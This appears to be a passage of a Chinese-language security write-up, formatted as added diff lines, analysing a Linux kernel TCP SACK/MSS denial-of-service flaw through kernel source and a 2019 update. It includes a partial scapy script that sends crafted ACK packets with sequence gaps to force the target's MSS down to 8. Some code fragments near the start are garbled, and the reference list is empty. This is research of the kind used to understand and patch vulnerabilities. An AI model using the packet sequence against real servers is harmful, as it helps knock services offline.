@@ -1,0 +1,92 @@
+    /* Subtract TCP options size, not including SACKs */
+    return __tcp_mtu_to_mss(sk, pmtu) -               (tcp_sk(sk)->tcp_header_len - sizeof(struct tcphdr));
+    __tcp_mtu_to_mss:
+    if (mss_now  defines"
+    #endif  
+        __be16  window;
+        __sum16 check;
+        __be16  urg_ptr;
+    };
+该结构体为TCP头固定结构的结构体，大小为20bytes
+变量`tcp_sk(sk)->tcp_header_len`表示的是本机发出的TCP包头部的长度。
+因此我们得到的计算mss_now的公式为：SYN包设置的MSS值 - (本机发出的TCP包头部长度 - TCP头部固定的20字节长度)
+所以，如果`tcp_header_len`的值能达到最大值60，那么mss_now就能被设置为8。那么内核代码中，有办法让`tcp_header_len`达到最大值长度吗？随后我们回溯该变量：
+    # tcp_output.c
+    tcp_connect_init:
+    tp->tcp_header_len = sizeof(struct tcphdr);
+        if (sock_net(sk)->ipv4.sysctl_tcp_timestamps)
+            tp->tcp_header_len += TCPOLEN_TSTAMP_ALIGNED;
+    #ifdef CONFIG_TCP_MD5SIG
+        if (tp->af_specific->md5_lookup(sk, sk))
+            tp->tcp_header_len += TCPOLEN_MD5SIG_ALIGNED;
+    #endif
+所以在Linux
+4.15内核中，在用户不干预的情况下，内核是不会发出头部大小为60字节的TCP包。这就导致了MSS无法被设置为最小值8，最终导致该漏洞无法利用。
+# 总结
+我们来总结一下整个流程：
+  1. 攻击者构造SYN包，自定义TCP头部可选参数MSS的值为48
+  2. 靶机（受到攻击的机器）接收到SYN请求后，把SYN包中的数据保存在内存中，返回SYN，ACK包。
+  3. 攻击者返回ACK包
+三次握手完成
+随后根据不同的服务，靶机主动向攻击者发送数据或者接收到攻击者的请求后向攻击者发送数据，这里就假设是一个nginx http服务。
+~~1\. 攻击者向靶机发送请求：`GET / HTTP/1.1`。~~
+~~2\.
+靶机接收到请求后，首先计算出`tcp_header_len`，默认等于20字节，在内核配置`sysctl_tcp_timestamps`开启的情况下，增加12字节，如果编译内核的时候选择了`CONFIG_TCP_MD5SIG`，会再增加18字节，也就是说`tcp_header_len`的最大长度为50字节。~~
+~~3\. 随后需要计算出mss_now = 48 - 50 + 20 = 18~~
+~~这里假设一下该漏洞可能利用成功的场景：有一个TCP服务，自己设定了TCP可选参数，并且设置满了40字节，那么攻击者才有可能通过构造SYN包中的MSS值来对该服务进行Dos攻击。~~
+~~随后我对Linux
+2.6.29至今的内核进行审计，mss_now的计算公式都一样，`tcp_header_len`长度也只会加上时间戳的12字节和md5值的18字节。~~
+\----- 2019/07/03 UPDATE -----
+经过@riatre大佬的指正，我发现上述我对`tcp_current_mss`函数的分析中漏了一段重要的代码：
+    # tcp_output.c
+    tcp_current_mss -> tcp_sync_mss:
+    mss_now = tcp_mtu_to_mss(sk, pmtu);
+    header_len = tcp_established_options(sk, NULL, &opts, &md5) + 
+                sizeof(struct tcphdr);
+    if (header_len != tp->tcp_header_len) {
+        int delta = (int) header_len - tp->tcp_header_len;
+        mss_now -= delta;
+    }
+在`tcp_established_options`函数的代码中，除了12字节的时间戳，20字节的md5，还有对SACK长度的计算，在长度不超过tcp可选项40字节限制的前提下，公式为：`size
+= 4 + 8 * opts->num_sack_blocks`
+    eff_sacks = tp->rx_opt.num_sacks + tp->rx_opt.dsack;
+    if (unlikely(eff_sacks)) {
+        const unsigned int remaining = MAX_TCP_OPTION_SPACE - size;
+        opts->num_sack_blocks =
+            min_t(unsigned int, eff_sacks,
+                  (remaining - TCPOLEN_SACK_BASE_ALIGNED) /
+                  TCPOLEN_SACK_PERBLOCK);
+        size += TCPOLEN_SACK_BASE_ALIGNED +
+            opts->num_sack_blocks * TCPOLEN_SACK_PERBLOCK;
+    }
+所以凑齐40字节的方法是：12字节的时间戳 + 8 * 3(opts->num_sack_blocks)
+变量`opts->num_sack_blocks`表示从对端接受的数据包中丢失的数据包数目
+所以在这里修改一下总结中后三步的过程：
+  1. 攻击者向靶机发送一段正常的HTTP请求
+  2. 靶机接收到请求后，会发送HTTP响应包，如上面的wireshark截图所示，响应包会按照36字节的长度分割成多分
+  3. 攻击者构造序列号带有缺漏的ACK包（ACK包需要带一些数据）
+  4. 服务器接收到无序的ACK包后，发现产生了丢包的情况，所以在后续发送的数据包中，都会带上SACK选项，告诉客户端，那些数据包丢失，直到TCP链接断开或者接收到响应序列的数据包。
+效果如下图所示:
+因为算上时间戳，TCP SACK选项里最多只能包含3段序列编号，所以只要发送4次ACK包，就能把MSS设置为8。
+部分scapy代码如下：
+    data = "GET / HTTP/1.1\nHost: 192.168.11.112\r\n\r\n"
+    ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
+    ACK.options = [("NOP",None), ("NOP",None), ('Timestamp', (1, 2))]
+    send(ip/ACK/data)
+    dl = len(data)
+    test = "a"*10
+    ACK.seq += dl + 20
+    ACK.ack = SYNACK.seq+73
+    send(ip/ACK/test)
+    ACK.seq += 30
+    ACK.ack = SYNACK.seq+181
+    send(ip/ACK/test)
+    ACK.seq += 30
+    ACK.ack = SYNACK.seq+253
+    send(ip/ACK/test)
+因为现在已经能满足mss_now=8的前提，后续将会对该漏洞进行进一步的分析。
+# 参考
+  1. 
+  2. 
+  3. 
+* * *
